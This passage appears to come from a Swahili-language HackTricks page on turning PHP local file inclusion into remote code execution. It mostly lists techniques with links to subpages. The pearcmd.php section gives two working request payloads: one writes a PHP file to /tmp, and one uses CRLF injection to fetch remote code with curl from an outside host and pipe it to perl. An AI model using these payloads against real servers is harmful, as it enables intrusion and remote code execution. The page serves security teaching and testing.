{{#endref}}

### Via segmentation fault

**Pakia** faili ambayo itahifadhiwa kama **ya muda** katika `/tmp`, kisha katika **ombio moja,** trigger **segmentation fault**, na kisha **faili ya muda haitafutwa** na unaweza kuitafuta.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Ikiwa umepata **Local File Inclusion** na **Nginx** inafanya kazi mbele ya PHP unaweza kuwa na uwezo wa kupata RCE kwa kutumia mbinu ifuatayo:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

Ikiwa umepata **Local File Inclusion** hata kama **huna session** na `session.auto_start` iko `Off`. Ikiwa utaweka **`PHP_SESSION_UPLOAD_PROGRESS`** katika **data ya multipart POST**, PHP itafanya **session iweze kwako**. Unaweza kutumia hii vibaya kupata RCE:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Ikiwa umepata **Local File Inclusion** na server inafanya kazi katika **Windows** unaweza kupata RCE:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

Kama [**ilivyoelezwa katika chapisho hili**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), script `/usr/local/lib/phppearcmd.php` inapatikana kwa default katika picha za docker za php. Zaidi ya hayo, inawezekana kupitisha hoja kwa script kupitia URL kwa sababu inabainishwa kwamba ikiwa param ya URL haina `=`, inapaswa kutumika kama hoja.

Ombi lifuatalo linaunda faili katika `/tmp/hello.php` yenye maudhui `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Inatumia udhaifu wa CRLF kupata RCE (kutoka [**hapa**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Kupitia phpinfo() (file_uploads = on)

Ikiwa umepata **Local File Inclusion** na faili inayonyesha **phpinfo()** na file_uploads = on unaweza kupata RCE:

{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Kupitia compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ikiwa umepata **Local File Inclusion** na unaweza **kuondoa njia** ya faili ya muda LAKINI **server** inakagua ikiwa **faili inayopaswa kujumuishwa ina alama za PHP**, unaweza kujaribu **kuepuka ukaguzi huo** kwa kutumia **Race Condition** hii:

{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Kupitia kusubiri milele + bruteforce

Ikiwa unaweza kutumia LFI ili **kupakia faili za muda** na kufanya server **kushindwa** katika utekelezaji wa PHP, unaweza kisha **kufanya brute force majina ya faili kwa masaa** ili kupata faili ya muda:

{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Kwa Kosa la Kifo

Ikiwa unajumuisha yoyote ya faili `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Unahitaji kujumuisha ile ile mara 2 ili kutupa kosa hilo).

**Sijui hii ni ya manufaa vipi lakini inaweza kuwa.**\
_Hata kama unasababisha Kosa la Kifo la PHP, faili za muda za PHP zilizopakiwa zinafuta._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## Marejeleo

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
